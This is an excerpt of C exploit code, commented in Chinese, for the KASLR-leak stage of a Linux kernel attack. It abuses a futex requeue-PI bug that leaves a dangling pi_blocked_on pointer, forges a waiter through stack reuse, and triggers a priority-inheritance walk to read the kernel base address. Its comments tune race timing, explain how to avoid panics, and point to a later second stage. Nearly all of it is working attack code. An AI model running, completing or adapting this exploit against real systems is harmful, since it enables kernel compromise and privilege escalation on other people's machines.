...
#define SLIDE_WAIT_NSEC_FAST 100000000  /* EDEADLK 快速路线:100ms 短超时 */
...
static atomic_int slide_deadlock_seen;   /* EDEADLK 回滚已发生,pi_blocked_on 残留 */
static atomic_int slide_stack_copy_done; /* waiter 已完成栈复用,伪造了 waiter */
static atomic_int slide_cleanup_go;      /* 主线程已读到 stext,允许 waiter 清理 */
static atomic_int slide_cleanup_done;    /* waiter 已 UNLOCK_PI 清掉 dangling */
...
static unsigned long slide_owner_chain_delay_usec(void) {
  return slide_env_ulong("SLIDE_OWNER_CHAIN_DELAY_USEC", 200000, 3000000);
}
...
static unsigned long slide_max_attempts(void) {
  return slide_env_ulong("SLIDE_MAX_ATTEMPTS", SLIDE_MAX_ATTEMPTS, 1000);
}
...
static unsigned long slide_wait_nsec(void) {
  return slide_env_ulong("SLIDE_WAIT_NSEC", SLIDE_WAIT_NSEC_FAST, 1000000000ULL);
}
...
void *slide_waiter_thread(void *arg __attribute__((unused))) {
  ...
  unsigned long wait_nsec = slide_wait_nsec();
  ...
  if (!env_flag("SLIDE_QUIET_FUTEX", 1)) {
    pr_info("slide wait_requeue_pi ret=%ld errno=%d wait_nsec=%lu\n",
            wait_ret, wait_errno, wait_nsec);
  }

  /* EDEADLK 快速路线(写入→读值→清理 顺序):
   * cleanup 已在 wait 返回前执行完,pi_blocked_on dangling 已成。
   * 不能先 UNLOCK_PI——实测它会清掉 dangling,PI walk 不再触发,泄漏失败。
   * 正确顺序:栈复用 → consumer sched_setattr 触发 PI walk 写 boot_id →
   * 主线程读到 stext → 发 cleanup_go → 此时才 UNLOCK_PI 让内核清掉
   * dangling,消除悬挂状态 → 不再延迟 panic。 */
  if (atomic_load(&slide_deadlock_seen)) {
    pr_info("slide waiter EDEADLK fast path — stack copying now (unlock deferred)\n");
    if (env_flag("SLIDE_TCP_ROUTE", 1)) {
      slide_tcp_stack_copy();
    } else {
      slide_pselect_stack_copy();
    }
    atomic_store(&slide_stack_copy_done, 1);
    atomic_store(&slide_route_done, 1);

    /* 等主线程读到 stext 后再 UNLOCK_PI 收敛 PI 状态。
     * 纯用户态自旋等待,零系统调用,不碰内核栈。 */
    if (env_flag("SLIDE_EDEADLK_CLEANUP", 1)) {
      while (!atomic_load(&slide_cleanup_go)) {
        __asm__ volatile("yield" ::: "memory");
      }
      errno = 0;
      long ul_ret = futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL,
                             NULL, 0);
      atomic_store(&slide_cleanup_done, 1);
      pr_info("slide EDEADLK deferred unlock_chain ret=%ld errno=%d\n",
              ul_ret, errno);
    }

    /* 纯用户态自旋:绝不进系统调用。sleep/pause 的内核栈帧会覆盖
     * 栈上伪造的 waiter,悬挂 pi_blocked_on 随即读到垃圾 → 延迟 panic。 */
    if (env_flag("SLIDE_SPIN_HOLD", 1)) {
      for (;;) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
...
void *slide_owner_thread(void *arg __attribute__((unused))) {
  ...
  /* Attempt chain lock; EDEADLK is common on this kernel variant.
   * Skip gracefully — owner holds f_pi_target, waiter blocked on it,
   * consumer's sched_setattr triggers PI walk regardless. */
  errno = 0;
  int chain_ret = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  int chain_errno = errno;
  if (!env_flag("SLIDE_QUIET_FUTEX", 1)) {
    pr_info("slide owner lock_chain ret=%d errno=%d delay_usec=%lu\n",
            chain_ret, chain_errno, owner_delay);
  }
  if (chain_ret != 0) {
    pr_info("slide owner chain skipped (errno=%d); held target\n", chain_errno);
  }

  /* EXPERIMENTAL: If SLIDE_OWNER_UNLOCK_TARGET is set, unlock f_pi_target
   * to let waiter wake up normally instead of timing out. This keeps
   * pi_blocked_on set when consumer calls sched_setattr. */
  if (env_flag("SLIDE_OWNER_UNLOCK_TARGET", 0)) {
    usleep(500000);  // Wait 500ms for consumer to be ready
    pr_info("slide owner unlocking target (experimental)\n");
    errno = 0;
    int unlock_ret = futex_op(&slide_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    pr_info("slide owner unlock_target ret=%d errno=%d\n", unlock_ret, errno);
  }
...
uint64_t slide_child_leak_stext(void) {
  ...
  /* EDEADLK 快速路线:
   * requeue 返回 EDEADLK → bug 已触发,pi_blocked_on 残留 →
   * 立刻通知 waiter 做栈复用 → consumer 触发 PI walk。
   * 这是 S26 PoC 的核心思路,避免等待 30 秒超时(超时会导致 cleanup 清掉 pi_blocked_on)。 */
  if (requeue_ret != 1 && requeue_errno == EDEADLK) {
    pr_info("slide EDEADLK detected — activating fast path (pi_blocked_on dangling)\n");
    atomic_store(&slide_deadlock_seen, 1);

    /* 等 waiter 完成栈复用、伪造好 waiter */
    while (!atomic_load(&slide_stack_copy_done)) {
      usleep(1000);
    }
    pr_info("slide EDEADLK fast path: stack copy done, reading stext\n");
    uint64_t stext = slide_read_stext();

    /* 读到值后才允许 waiter UNLOCK_PI 清理 dangling;
     * 泄漏失败时保持锁定,避免无意义的 unlock 竞态。 */
    if (stext && env_flag("SLIDE_EDEADLK_CLEANUP", 1)) {
      atomic_store(&slide_cleanup_go, 1);
      while (!atomic_load(&slide_cleanup_done)) {
        usleep(1000);
      }
      pr_info("slide EDEADLK cleanup done (dangling pi_blocked_on cleared)\n");
    }
    return stext;
  }

  if (requeue_ret != 1) {
    pr_warning("slide aborting route after failed cmp_requeue_pi ret=%ld errno=%d\n",
               requeue_ret, requeue_errno);
    return 0;
  }

  /* EXPERIMENTAL: Trigger consumer immediately after requeue while waiter is blocked */
  if (env_flag("SLIDE_EARLY_CONSUMER", 0)) {
    pr_info("slide triggering consumer early while waiter blocked\n");
    atomic_store(&slide_consume_go, 1);
    usleep(100000);  // Wait 100ms for consumer to call sched_setattr
    atomic_store(&slide_consume_go, 0);
  }
...
int slide_leak_kernel_base(void) {
  ...
  unsigned long max_attempts = slide_max_attempts();
  ...
  for (unsigned long attempt = 1; attempt <= max_attempts; attempt++) {
    ...
    pr_info("slide attempt %lu/%lu uses pselect shift=%d\n",
            attempt, max_attempts, slide_runtime_shift);
    ...
    if (child == 0) {
      ...
      if (stext) {
        ssize_t w = write(fds[1], &stext, sizeof(stext));
        close(fds[1]);
        if (w == (ssize_t)sizeof(stext)) {
          /* 绝不能 _exit:exit_group 会杀死自旋的 waiter 线程,
           * 内核 PI cleanup 踩伪造 waiter → panic 重启。
           * SIGSTOP 挂起成为孤儿:不占 CPU、不干扰第二阶段,
           * 内核栈保留但 pi_blocked_on 已清,不再被引用。 */
          raise(SIGSTOP);
          for (;;) pause();
        }
      }
      /* 失败路径:未触发 EDEADLK,无栈复用,PI 状态正常,可安全退出 */
      _exit(1);
    }
    ...
    SYSCHK(close(fds[0]));
    /* 不 waitpid:child 泄漏成功后 SIGSTOP 挂起,永不退出 */
    if (n != (ssize_t)sizeof(stext) || !stext) {
      pr_warning("slide attempt %lu failed n=%zd\n", attempt, n);
      continue;
    }

    /* 清理泄漏阶段 prepare_good_kernel_page 的资源:
     * prepare_ctx.childs(1024 个 pause 子进程)必须 kill,
     * 否则第二阶段再 fork 1024 个导致进程数翻倍、fd 泄漏 → 卡死。 */
